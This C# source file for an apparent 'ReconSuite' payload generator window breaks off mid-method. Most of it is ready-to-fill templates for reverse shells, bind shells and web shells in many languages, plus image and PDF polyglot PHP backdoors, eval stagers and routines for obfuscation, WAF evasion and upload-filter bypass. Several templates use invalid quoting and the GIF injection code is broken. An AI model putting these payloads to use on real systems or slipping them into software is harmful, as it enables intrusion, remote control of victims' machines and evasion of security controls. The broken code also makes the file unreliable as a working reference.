using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Microsoft.Win32;

namespace ReconSuite
{
    public partial class PayloadGenerator : Window
    {
        private string currentPayload = "";
        private string currentDecodedPayload = "";
        private string currentHexPayload = "";
        private bool showingRaw = true;
        private Random random = new Random();
        private string selectedImagePath = "";
        private HttpClient httpClient = new HttpClient();

       
        private Dictionary<string, Dictionary<string, string>> payloadTemplates = new Dictionary<string, Dictionary<string, string>>();

        
        private Dictionary<string, byte[]> magicBytes = new Dictionary<string, byte[]>
        {
            ["JPEG"] = new byte[] { 0xFF, 0xD8, 0xFF, 0xE0 },
            ["PNG"] = new byte[] { 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A },
            ["GIF"] = Encoding.ASCII.GetBytes("GIF89a;"),
            ["PDF"] = Encoding.ASCII.GetBytes("%PDF-1.4"),
            ["ZIP"] = new byte[] { 0x50, 0x4B, 0x03, 0x04 }
        };

        public PayloadGenerator()
        {
            InitializeComponent();
            InitializeTemplates();
        }

        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            UpdateUI();
        }

        private void InitializeTemplates()
        {
            
            var reverseShells = new Dictionary<string, string>
            {
                ["PHP"] = @"<?php
// PHP Reverse Shell - Ultimate Edition
set_time_limit(0);
$ip = '{LHOST}';
$port = {LPORT};
$sock = fsockopen($ip, $port);
$descriptorspec = array(
    0 => $sock,
    1 => $sock,
    2 => $sock
);
$process = proc_open('/bin/sh -i', $descriptorspec, $pipes);
proc_close($process);
?>",

                ["PHP-Obfuscated"] = @"<?php
$͏_=chr(102).chr(115).chr(111).chr(99).chr(107).chr(111).chr(112).chr(101).chr(110);
$͏_($͏=chr(123).chr(76).chr(72).chr(79).chr(83).chr(84).chr(125),$͏=chr(123).chr(76).chr(80).chr(79).chr(82).chr(84).chr(125));
?>",

                ["Python"] = @"#!/usr/bin/python3
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('{LHOST}',{LPORT}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(['/bin/sh','-i'])",

                ["Python-Advanced"] = @"#!/usr/bin/python3
import socket,pty,os
s=socket.socket()
s.connect(('{LHOST}',{LPORT}))
[os.dup2(s.fileno(),f) for f in(0,1,2)]
pty.spawn('/bin/bash')",

                ["Bash"] = @"#!/bin/bash
bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",

                ["Bash-UDP"] = @"#!/bin/bash
bash -i >& /dev/udp/{LHOST}/{LPORT} 0>&1",

                ["PowerShell"] = @"# PowerShell Reverse Shell
$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()",

                ["PowerShell-Encoded"] = @"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {BASE64}",

                ["Perl"] = @"#!/usr/bin/perl
use Socket;
$i='{LHOST}';
$p={LPORT};
socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
    open(STDIN,'>&S');
    open(STDOUT,'>&S');
    open(STDERR,'>&S');
    exec('/bin/sh -i');
};",

                ["Ruby"] = @"#!/usr/bin/ruby
require 'socket'
c=TCPSocket.new('{LHOST}',{LPORT})
$stdin.reopen(c)
$stdout.reopen(c)
$stderr.reopen(c)
$stdin.each_line{|l|l=l.strip;next if l.empty?;
    (IO.popen(l,'rb'){|fd| fd.each_line{|o| c.puts(o.strip) }}) rescue nil
}",

                ["Java"] = @"// Java Reverse Shell
import java.io.*;
import java.net.*;
public class RevShell {
    public static void main(String[] args) {
        try {
            String host = '{LHOST}';
            int port = {LPORT};
            Socket s = new Socket(host, port);
            Process p = Runtime.getRuntime().exec('/bin/sh');
            new StreamConnector(p.getInputStream(), s.getOutputStream()).start();
            new StreamConnector(s.getInputStream(), p.getOutputStream()).start();
        } catch(Exception e) {}
    }
}
class StreamConnector extends Thread {
    InputStream is; OutputStream os;
    StreamConnector(InputStream is, OutputStream os) { this.is = is; this.os = os; }
    public void run() {
        try {
            int n;
            while((n = is.read()) != -1) os.write(n);
        } catch(Exception e) {}
    }
}",

                ["C"] = @"// C Reverse Shell
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
int main() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons({LPORT});
    inet_pton(AF_INET, '{LHOST}', &addr.sin_addr);
    connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
    execve('/bin/sh', NULL, NULL);
    return 0;
}",

                ["ASP"] = @"<%
Set s = Server.CreateObject('WScript.Shell')
Set c = s.Exec('cmd.exe /c powershell -NoP -NonI -W Hidden -Exec Bypass -Command ""$c=New-Object System.Net.Sockets.TCPClient(''{LHOST}'',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+''PS ''+(pwd).Path+''> '';$sb2=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($sb2,0,$sb2.Length);$s.Flush()};$c.Close()""')
Response.Write(c.StdOut.ReadAll()) %>",

                ["ASPX"] = @"<%@ Page Language='C#' %>
<%@ Import Namespace='System.Net' %>
<%@ Import Namespace='System.Net.Sockets' %>
<%@ Import Namespace='System.Diagnostics' %>
<script runat='server'>
protected void Page_Load(object sender, EventArgs e) {
    string host = '{LHOST}';
    int port = {LPORT};
    using (TcpClient client = new TcpClient(host, port)) {
        using (Stream stream = client.GetStream()) {
            using (StreamReader reader = new StreamReader(stream)) {
                using (StreamWriter writer = new StreamWriter(stream)) {
                    Process p = new Process();
                    p.StartInfo.FileName = 'cmd.exe';
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.RedirectStandardInput = true;
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.RedirectStandardError = true;
                    p.Start();
                    p.StandardInput.AutoFlush = true;
                    new System.Threading.Thread(() => {
                        while (true) {
                            string line = reader.ReadLine();
                            if (line == null) break;
                            p.StandardInput.WriteLine(line);
                        }
                    }).Start();
                    writer.Write(p.StandardOutput.ReadToEnd());
                }
            }
        }
    }
}
</script>",

                ["JSP"] = @"<%@ page import='java.io.*' %>
<%@ page import='java.net.*' %>
<%
String host = '{LHOST}';
int port = {LPORT};
Socket s = new Socket(host, port);
Process p = Runtime.getRuntime().exec('/bin/sh');
new StreamConnector(p.getInputStream(), s.getOutputStream()).start();
new StreamConnector(s.getInputStream(), p.getOutputStream()).start();
class StreamConnector extends Thread {
    InputStream is; OutputStream os;
    StreamConnector(InputStream is, OutputStream os) { this.is = is; this.os = os; }
    public void run() {
        try {
            int n;
            while((n = is.read()) != -1) os.write(n);
        } catch(Exception e) {}
    }
}
%>",

                ["Node.js"] = @"// Node.js Reverse Shell
(function() {
    var net = require('net');
    var cp = require('child_process');
    var sh = cp.spawn('/bin/sh', []);
    var client = new net.Socket();
    client.connect({LPORT}, '{LHOST}', function() {
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();",

                ["C#"] = @"// C# Reverse Shell
using System;
using System.Text;
using System.Net.Sockets;
using System.Diagnostics;
namespace RevShell {
    class Program {
        static void Main() {
            using (TcpClient client = new TcpClient('{LHOST}', {LPORT})) {
                using (Stream stream = client.GetStream()) {
                    using (StreamReader reader = new StreamReader(stream)) {
                        using (StreamWriter writer = new StreamWriter(stream)) {
                            Process p = new Process();
                            p.StartInfo.FileName = 'cmd.exe';
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.Start();
                            p.StandardInput.AutoFlush = true;
                            new System.Threading.Thread(() => {
                                while (true) {
                                    string line = reader.ReadLine();
                                    if (line == null) break;
                                    p.StandardInput.WriteLine(line);
                                }
                            }).Start();
                            writer.Write(p.StandardOutput.ReadToEnd());
                        }
                    }
                }
            }
        }
    }
}",

                ["Go"] = @"// Go Reverse Shell
package main
import (
    ""net""
    ""os""
    ""os/exec""
)
func main() {
    c, _ := net.Dial(''tcp'', ''{LHOST}:{LPORT}'')
    cmd := exec.Command(''/bin/sh'')
    cmd.Stdin = c
    cmd.Stdout = c
    cmd.Stderr = c
    cmd.Run()
}",

                ["Rust"] = @"// Rust Reverse Shell
use std::io::prelude::*;
use std::net::TcpStream;
use std::process::Command;
fn main() {
    let mut s = TcpStream::connect(''{LHOST}:{LPORT}'').unwrap();
    let mut cmd = Command::new(''/bin/sh'')
        .stdin(s.try_clone().unwrap())
        .stdout(s.try_clone().unwrap())
        .stderr(s.try_clone().unwrap())
        .spawn().unwrap();
    cmd.wait().unwrap();
}"
            };

            
            var bindShells = new Dictionary<string, string>
            {
                ["PHP"] = @"<?php
$port = {LPORT};
$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_bind($sock, '0.0.0.0', $port);
socket_listen($sock);
$client = socket_accept($sock);
while(false !== ($buf = socket_read($client, 2048))) {
    $output = shell_exec($buf);
    socket_write($client, $output, strlen($output));
}
socket_close($client);
socket_close($sock);
?>",

                ["Python"] = @"#!/usr/bin/python3
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(('0.0.0.0',{LPORT}))
s.listen(1)
c,addr=s.accept()
os.dup2(c.fileno(),0)
os.dup2(c.fileno(),1)
os.dup2(c.fileno(),2)
subprocess.call(['/bin/sh','-i'])",

                ["Bash"] = @"#!/bin/bash
nc -lvnp {LPORT} -e /bin/sh",

                ["PowerShell"] = @"$listener = [System.Net.Sockets.TcpListener]::{LPORT};
$listener.Start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close();
$listener.Stop();"
            };

            
            var webShells = new Dictionary<string, string>
            {
                ["PHP"] = @"<?php
if(isset($_REQUEST['cmd'])){
    echo '<pre>' . shell_exec($_REQUEST['cmd']) . '</pre>';
}
?>",

                ["PHP-Advanced"] = @"<?php
// Multi-function web shell
$cmd = $_REQUEST['cmd'] ?? $_REQUEST['c'] ?? $_POST['command'] ?? $_GET['exec'];
if($cmd){
    echo '<pre>';
    if(function_exists('system')){
        system($cmd);
    } elseif(function_exists('exec')){
        exec($cmd, $output);
        echo implode('', $output);
    } elseif(function_exists('shell_exec')){
        echo shell_exec($cmd);
    } elseif(function_exists('passthru')){
        passthru($cmd);
    } else {
        echo 'No execution function available';
    }
    echo '</pre>';
}
?>",

                ["ASP"] = @"<%
Dim cmd
cmd = Request.QueryString('cmd')
If cmd <> '' Then
    Dim wsh, exec, output
    Set wsh = Server.CreateObject('WScript.Shell')
    Set exec = wsh.Exec('cmd.exe /c ' & cmd)
    output = exec.StdOut.ReadAll()
    Response.Write('<pre>' & output & '</pre>')
End If
%>",

                ["ASPX"] = @"<%@ Page Language='C#' %>
<%@ Import Namespace='System.Diagnostics' %>
<script runat='server'>
protected void Page_Load(object sender, EventArgs e) {
    string cmd = Request.QueryString['cmd'];
    if (!string.IsNullOrEmpty(cmd)) {
        Process p = new Process();
        p.StartInfo.FileName = 'cmd.exe';
        p.StartInfo.Arguments = '/c ' + cmd;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        string output = p.StandardOutput.ReadToEnd();
        p.WaitForExit();
        Response.Write('<pre>' + output + '</pre>');
    }
}
</script>",

                ["JSP"] = @"<%@ page import='java.io.*' %>
<%
String cmd = request.getParameter('cmd');
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    out.println('<pre>');
    while ((line = reader.readLine()) != null) {
        out.println(line);
    }
    out.println('</pre>');
}
%>"
            };

            
            var fileUploads = new Dictionary<string, string>
            {
                ["PHP"] = @"GIF89a;
<?php
// Ultra-hidden PHP backdoor
if(isset($_REQUEST['c'])){
    $c=$_REQUEST['c'];
    if(function_exists('system')){
        system($c);
    } elseif(function_exists('exec')){
        exec($c,$o);echo implode('',$o);
    } elseif(function_exists('shell_exec')){
        echo shell_exec($c);
    }
}
?>",

                ["PHP-ImagePolyglot"] = @"ÿØÿàJFIF
<?php system($_GET['cmd']); ?>",

                ["PHP-PDFPolyglot"] = @"%PDF-1.4
%�Ō�\n<?php system($_GET['cmd']); ?>\n%%EOF",

                ["DoubleExtension"] = @"<?php system($_GET['cmd']); ?>"
            };

            
            var stagers = new Dictionary<string, string>
            {
                ["PHP"] = @"<?php
// Multi-stage stager
$code = base64_decode('{BASE64_CODE}');
$code = gzinflate($code);
eval($code);
?>",

                ["Python"] = @"#!/usr/bin/python3
import base64,zlib
code = base64.b64decode('{BASE64_CODE}')
exec(zlib.decompress(code))",

                ["PowerShell"] = @"$code = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{BASE64_CODE}'))
$code = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($code))
Invoke-Expression $code"
            };

           
            var meterpreter = new Dictionary<string, string>
            {
                ["PHP"] = @"<?php
// PHP Meterpreter Stager
$ip = '{LHOST}';
$port = {LPORT};
$payload = ""windows/meterpreter/reverse_tcp"";
?>",

                ["Python"] = @"#!/usr/bin/python3
# Meterpreter stager placeholder",

                ["PowerShell"] = @"# PowerShell Meterpreter Stager
$c = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});
$s = $c.GetStream();
[byte[]]$b = 0..65535|%{0};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $sb = (iex $d 2>&1 | Out-String );
    $sb2 = $sb + 'PS ' + (pwd).Path + '> ';
    $sb3 = ([text.encoding]::ASCII).GetBytes($sb2);
    $s.Write($sb3,0,$sb3.Length);
    $s.Flush()
};
$c.Close()"
            };

            payloadTemplates["ReverseShell"] = reverseShells;
            payloadTemplates["BindShell"] = bindShells;
            payloadTemplates["WebShell"] = webShells;
            payloadTemplates["FileUpload"] = fileUploads;
            payloadTemplates["Stager"] = stagers;
            payloadTemplates["Meterpreter"] = meterpreter;
        }

        private void UpdateUI()
        {
            if (RadioFileUpload == null || RadioStager == null ||
                TargetURLLabel == null || TargetURLInput == null ||
                FieldNameLabel == null || FieldNameInput == null)
                return;

            bool showUrl = (RadioFileUpload.IsChecked == true || RadioStager.IsChecked == true || RadioMeterpreter.IsChecked == true);

            TargetURLLabel.Visibility = showUrl ? Visibility.Visible : Visibility.Collapsed;
            TargetURLInput.Visibility = showUrl ? Visibility.Visible : Visibility.Collapsed;
            FieldNameLabel.Visibility = showUrl ? Visibility.Visible : Visibility.Collapsed;
            FieldNameInput.Visibility = showUrl ? Visibility.Visible : Visibility.Collapsed;
        }

        private void PayloadType_Changed(object sender, RoutedEventArgs e)
        {
            if (!IsInitialized) return;

            UpdateUI();

            if (RadioFileUpload?.IsChecked == true)
            {
                if (LanguageCombo != null) LanguageCombo.SelectedIndex = 0; 
                if (FileExtensionInput != null) FileExtensionInput.Text = "php";
                if (TypeText != null) TypeText.Text = "File Upload Bypass";
            }
            else if (RadioReverseShell?.IsChecked == true)
            {
                if (TypeText != null) TypeText.Text = "Reverse Shell";
            }
            else if (RadioBindShell?.IsChecked == true)
            {
                if (TypeText != null) TypeText.Text = "Bind Shell";
            }
            else if (RadioWebShell?.IsChecked == true)
            {
                if (TypeText != null) TypeText.Text = "Web Shell";
                if (LPortInput != null) LPortInput.Text = "8080";
            }
            else if (RadioStager?.IsChecked == true)
            {
                if (TypeText != null) TypeText.Text = "Stager";
            }
            else if (RadioMeterpreter?.IsChecked == true)
            {
                if (TypeText != null) TypeText.Text = "Meterpreter";
                if (LPortInput != null) LPortInput.Text = "4444";
            }
        }

        private void SelectImageBtn_Click(object sender, RoutedEventArgs e)
        {
            var dialog = new OpenFileDialog
            {
                Filter = "Image Files|*.jpg;*.jpeg;*.png;*.gif;*.bmp|PDF Files|*.pdf|ZIP Files|*.zip|All Files|*.*",
                Title = "Select File for Payload Injection"
            };

            if (dialog.ShowDialog() == true)
            {
                selectedImagePath = dialog.FileName;
                SelectedImageText.Text = Path.GetFileName(selectedImagePath);
                SelectedImageText.Foreground = Brushes.LightGreen;
            }
        }

        private async void GenerateBtn_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                StatusText.Text = "GENERATING...";
                StatusText.Foreground = Brushes.Yellow;

                string lhost = LHostInput.Text.Trim();
                string lport = LPortInput.Text.Trim();
                string language = ((ComboBoxItem)LanguageCombo.SelectedItem).Content.ToString();
                string payloadType = GetSelectedPayloadType();

                if (string.IsNullOrEmpty(lhost) || string.IsNullOrEmpty(lport))
                {
                    MessageBox.Show("Please enter LHOST and LPORT", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                    return;
                }

                if (!int.TryParse(lport, out int portNum))
                {
                    MessageBox.Show("Invalid port number", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                    return;
                }

                
                string template = GetTemplate(payloadType, language);
                if (string.IsNullOrEmpty(template))
                {
                    template = GetAlternativeTemplate(payloadType, language);
                }

                if (string.IsNullOrEmpty(template))
                {
                    MessageBox.Show($"No template available for {language} {payloadType}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                    return;
                }

                
                currentDecodedPayload = template
                    .Replace("{LHOST}", lhost)
                    .Replace("{LPORT}", lport);

                
                string wafBypassed = ApplyWAFBypass(currentDecodedPayload);

                
                currentPayload = await ApplyMultiLayerObfuscation(wafBypassed);

                
                if (!string.IsNullOrEmpty(selectedImagePath) &&
                    (RadioInjectJPEG.IsChecked == true || RadioInjectPNG.IsChecked == true ||
                     RadioInjectGIF.IsChecked == true || RadioInjectPDF.IsChecked == true ||
                     RadioInjectZIP.IsChecked == true))
                {
                    currentPayload = await InjectIntoFile(selectedImagePath, currentPayload);
                }
                else if (CheckMagicBytes.IsChecked == true && !string.IsNullOrEmpty(MagicBytesInput.Text))
                {
                    currentPayload = MagicBytesInput.Text + "\n" + currentPayload;
                }

                
                string filename = ApplyExtensionBypass($"payload.{FileExtensionInput.Text}");

               
                showingRaw = true;
                PayloadOutputBox.Text = currentPayload;
                PayloadInfoText.Text = $"Generated: {language} {payloadType} - {DateTime.Now:HH:mm:ss}";
                LangText.Text = language;

               
                int sizeInBytes = Encoding.UTF8.GetBytes(currentPayload).Length;
                SizeText.Text = sizeInBytes < 1024 ? $"{sizeInBytes} bytes" : $"{sizeInBytes / 1024.0:F2} KB";

                
                int layers = 0;
                if (CheckBase64.IsChecked == true) layers++;
                if (CheckBase64Twice.IsChecked == true) layers += 2;
                if (CheckHex.IsChecked == true) layers++;
                if (CheckURLEncode.IsChecked == true) layers++;
                if (CheckURLEncodeTwice.IsChecked == true) layers += 2;
                if (CheckReverse.IsChecked == true) layers++;
                if (CheckROT13.IsChecked == true) layers++;
                if (CheckMinify.IsChecked == true) layers++;
                if (CheckRandomVars.IsChecked == true) layers++;
                if (CheckChunked.IsChecked == true) layers++;
                if (CheckComments.IsChecked == true) layers++;
                if (CheckHTMLComments.IsChecked == true) layers++;
                if (CheckWhitespace.IsChecked == true) layers++;
                ObfuscationLayersText.Text = layers.ToString();

               
                List<string> bypasses = new List<string>();
                if (CheckDoubleExtension.IsChecked == true) bypasses.Add("DoubleExt");
                if (CheckNullByte.IsChecked == true) bypasses.Add("NullByte");
                if (CheckCaseSpoof.IsChecked == true) bypasses.Add("CaseSpoof");
                if (CheckMimeSpoof.IsChecked == true) bypasses.Add("MimeSpoof");
                if (CheckMagicBytes.IsChecked == true) bypasses.Add("MagicBytes");
                if (RadioInjectJPEG.IsChecked == true) bypasses.Add("JPEG");
                if (RadioInjectPNG.IsChecked == true) bypasses.Add("PNG");
                if (RadioInjectGIF.IsChecked == true) bypasses.Add("GIF");
                if (RadioInjectPDF.IsChecked == true) bypasses.Add("PDF");
                if (RadioInjectZIP.IsChecked == true) bypasses.Add("ZIP");

                BypassText.Text = bypasses.Count > 0 ? string.Join(", ", bypasses) : "None";

                StatusText.Text = "GENERATED!";
                StatusText.Foreground = Brushes.LightGreen;
            }
            catch (Exception ex)
            {
                StatusText.Text = "ERROR";
                StatusText.Foreground = Brushes.Red;
                MessageBox.Show($"Error generating payload: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private string ApplyExtensionBypass(string filename)
        {
            string result = filename;

            if (CheckDoubleExtension.IsChecked == true)
            {
                result = result.Replace(".", ".jpg.");
            }

            if (CheckNullByte.IsChecked == true)
            {
                result = result.Replace(".", "%00.");
            }

            if (CheckCaseSpoof.IsChecked == true)
            {
                string ext = Path.GetExtension(result);
                string name = Path.GetFileNameWithoutExtension(result);
                result = name + ext.ToUpper();
            }

            return result;
        }

        private string ApplyWAFBypass(string payload)
        {
            string result = payload;

            if (CheckCaseRandom.IsChecked == true)
            {
                
                string[] keywords = { "system", "exec", "shell_exec", "passthru", "eval", "assert" };
                foreach (var keyword in keywords)
                {
                    if (result.Contains(keyword))
                    {
                        string randomized = new string(keyword.Select(c => random.Next(2) == 0 ? char.ToUpper(c) : char.ToLower(c)).ToArray());
                        result = result.Replace(keyword, randomized);
                    }
                }
            }

            if (CheckSpaceRandom.IsChecked == true)
            {
                
                result = Regex.Replace(result, @"\s+", m =>
                    new string(Enumerable.Repeat(' ', random.Next(1, 5)).ToArray()));
            }

            if (CheckCommentInsert.IsChecked == true)
            {
                
                result = Regex.Replace(result, @"(;|\{|\})", m =>
                    m.Value + "/*" + RandomString(5) + "*/");
            }

            if (CheckCharSubstitution.IsChecked == true)
            {
                result = result.Replace('a', '@').Replace('e', '3').Replace('i', '1').Replace('o', '0').Replace('s', '$');
            }

            if (CheckHexKeywords.IsChecked == true && result.Contains("system"))
            {
                
                result = result.Replace("system", @"\x73\x79\x73\x74\x65\x6d");
            }

            if (CheckConcatenation.IsChecked == true)
            {
                
                result = Regex.Replace(result, @"(['""])([^'""]+)(['""])",
                    m => m.Groups[1].Value + m.Groups[2].Value + m.Groups[3].Value + " . ''");
            }

            return result;
        }

        private async Task<string> ApplyMultiLayerObfuscation(string payload)
        {
            string result = payload;

            
            if (CheckReverse.IsChecked == true)
            {
                char[] chars = result.ToCharArray();
                Array.Reverse(chars);
                result = new string(chars);
            }

            if (CheckROT13.IsChecked == true)
            {
                result = Rot13(result);
            }

            if (CheckMinify.IsChecked == true)
            {
                result = Regex.Replace(result, @"//.*?$", "", RegexOptions.Multiline);
                result = Regex.Replace(result, @"\s+", " ");
                result = Regex.Replace(result, @"\s*([{};()=<>+\-*/!])\s*", "$1");
            }

            if (CheckRandomVars.IsChecked == true)
            {
                result = Regex.Replace(result, @"\$[a-zA-Z_][a-zA-Z0-9_]*",
                    m => "$" + RandomString(8));
            }

            if (CheckWhitespace.IsChecked == true)
            {
                result = Regex.Replace(result, @"\s", m =>
                    random.Next(3) == 0 ? "\t" : (random.Next(2) == 0 ? " " : "\n"));
            }

            if (CheckComments.IsChecked == true)
            {
                result = "/*" + RandomString(10) + "*/" + result + "/*" + RandomString(10) + "*/";
            }

            if (CheckHTMLComments.IsChecked == true)
            {
                result = "<!-- " + RandomString(15) + " -->\n" + result + "\n<!-- " + RandomString(15) + " -->";
            }

            if (CheckURLEncode.IsChecked == true)
            {
                result = Uri.EscapeDataString(result);
            }

            if (CheckURLEncodeTwice.IsChecked == true)
            {
                result = Uri.EscapeDataString(Uri.EscapeDataString(result));
            }

            if (CheckBase64.IsChecked == true)
            {
                byte[] bytes = Encoding.UTF8.GetBytes(result);
                result = Convert.ToBase64String(bytes);

                if (CheckBase64Twice.IsChecked == true)
                {
                    bytes = Encoding.UTF8.GetBytes(result);
                    result = Convert.ToBase64String(bytes);
                }
            }

            if (CheckHex.IsChecked == true)
            {
                byte[] bytes = Encoding.UTF8.GetBytes(result);
                result = BitConverter.ToString(bytes).Replace("-", "").ToLower();
            }

            if (CheckChunked.IsChecked == true && int.TryParse(ChunkSizeInput.Text, out int chunkSize))
            {
                result = ChunkPayload(result, chunkSize);
            }

           
            byte[] resultBytes = Encoding.UTF8.GetBytes(result);
            currentHexPayload = BitConverter.ToString(resultBytes).Replace("-", " ").ToLower();

            return result;
        }

        private string ChunkPayload(string payload, int chunkSize)
        {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < payload.Length; i += chunkSize)
            {
                int length = Math.Min(chunkSize, payload.Length - i);
                string chunk = payload.Substring(i, length);
                sb.AppendLine($"Chunk {i / chunkSize + 1}: {chunk}");
            }
            return sb.ToString();
        }

        private async Task<string> InjectIntoFile(string filePath, string payload)
        {
            try
            {
                byte[] fileBytes = await File.ReadAllBytesAsync(filePath);
                byte[] payloadBytes = Encoding.UTF8.GetBytes(payload);

                using (MemoryStream ms = new MemoryStream())
                {
                    await ms.WriteAsync(fileBytes, 0, fileBytes.Length);

                  
                    if (RadioInjectJPEG.IsChecked == true)
                    {
                        
                        ms.Write(payloadBytes, 0, payloadBytes.Length);
                    }
                    else if (RadioInjectPNG.IsChecked == true)
                    {
                        
                        ms.Write(payloadBytes, 0, payloadBytes.Length);
                    }
                    else if (RadioInjectGIF.IsChecked == true)
                    {
                       
                        ms.Write(Encoding.ASCII.GetBytes("<?php system($_GET['cmd']); ?>"), 0, payloadBytes.Length);
                    }
                    else if (RadioInjectPDF.IsChecked == true)
                    {
                        
                        string pdfPayload = $"% {payload}\n";
                        byte[] pdfBytes = Encoding.ASCII.GetBytes(pdfPayload);
                        ms.Write(pdfBytes, 0, pdfBytes.Length);
                    }
                    else if (RadioInjectZIP.IsChecked == true)
                    {
                        
                        ms.Write(payloadBytes, 0, payloadBytes.Length);
                    }

                    return Encoding.UTF8.GetString(ms.ToArray());
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error injecting into file: {ex.Message}", "Warning", MessageBoxButton.OK, MessageBoxImage.Warning);
                return payload;
            }
        }

        private string Rot13(string input)
        {
            char[] array = input.ToCharArray();
            for (int i = 0; i < array.Length; i++)
            {
                if (array[i] >= 'a' && array[i] <= 'z')
                {
                    array[i] = (char)('a' + (array[i] - 'a' + 13) % 26);
                }
                else if (array[i] >= 'A' && array[i] <= 'Z')
                {
                    array[i] = (char)('A' + (array[i] - 'A' + 13) % 26);
                }
            }
            return new string(array);
        }

        private string RandomString(int length)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private string GetSelectedPayloadType()
        {
            if (RadioReverseShell.IsChecked == true) return "ReverseShell";
            if (RadioBindShell.IsChecked == true) return "BindShell";
            if (RadioWebShell.IsChecked == true) return "WebShell";
            if (RadioFileUpload.IsChecked == true) return "FileUpload";
            if (RadioStager.IsChecked == true) return "Stager";
            if (RadioMeterpreter.IsChecked == true) return "Meterpreter";
            return "ReverseShell";
        }

        private string GetTemplate(string payloadType, string language)
        {
            if (payloadTemplates.ContainsKey(payloadType) &&
                payloadTemplates[payloadType].ContainsKey(language))
            {
                return payloadTemplates[payloadType][language];
            }
            return null;
        }

        private string GetAlternativeTemplate(string payloadType, string language)
        {
            if (payloadType == "FileUpload" && language != "PHP")
            {
                return payloadTemplates["FileUpload"]["PHP"];
            }

            if (payloadTemplates.ContainsKey(payloadType) && payloadTemplates[payloadType].Count > 0)
            {
                return payloadTemplates[payloadType].First().Value;
            }

            return null;
        }

        private void PreviewRawBtn_Click(object sender, RoutedEventArgs e)
        {
            if (!string.IsNullOrEmpty(currentPayload) && !showingRaw)
            {
                PayloadOutputBox.Text = currentPayload;
                showingRaw = true;
                PreviewRawBtn.Background = Brushes.DarkRed;
                PreviewDecodedBtn.Background = Brushes.Transparent;
                PreviewHexBtn.Background = Brushes.Transparent;
            }
        }

        private void PreviewDecodedBtn_Click(object sender, RoutedEventArgs e)
        {
            if (!string.IsNullOrEmpty(currentDecodedPayload) && showingRaw)
            {
                PayloadOutputBox.Text = currentDecodedPayload;
                showingRaw = false;
                PreviewDecodedBtn.Background = Brushes.DarkRed;
                PreviewRawBtn.Background = Brushes.Transparent;
                PreviewHexBtn.Background = Brushes.Transparent;
            }
        }

        private void PreviewHexBtn_Click(object sender, RoutedEventArgs e)
        {
            if (!string.IsNullOrEmpty(currentHexPayload))
